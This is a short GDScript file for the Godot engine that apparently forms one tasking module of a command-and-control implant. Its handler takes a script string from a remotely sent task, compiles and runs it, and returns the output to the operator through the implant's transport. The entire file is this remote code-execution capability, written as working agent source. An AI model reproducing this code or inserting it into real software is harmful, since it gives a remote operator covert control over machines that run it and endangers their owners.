extends Node

func _on_tasking_gdscript(transport, task):
	var test_json_conv = JSON.new()
	test_json_conv.parse(task.get("parameters"))
	var parameters = test_json_conv.get_data()
	var gdscript = GDScript.new()
	gdscript.source_code = parameters.get("script")
	gdscript.reload()
	var script_instance = gdscript.new()
	var output = script_instance.call("invoke")
	print_debug("executing the following command and arguments")
	print_debug(gdscript.source_code)
	print_debug("")
	print_debug(output)
	print_debug("")

	transport.send(
		transport.create_task_response(
			true,
			true,
			task.get("id"),
			output
		)
	)
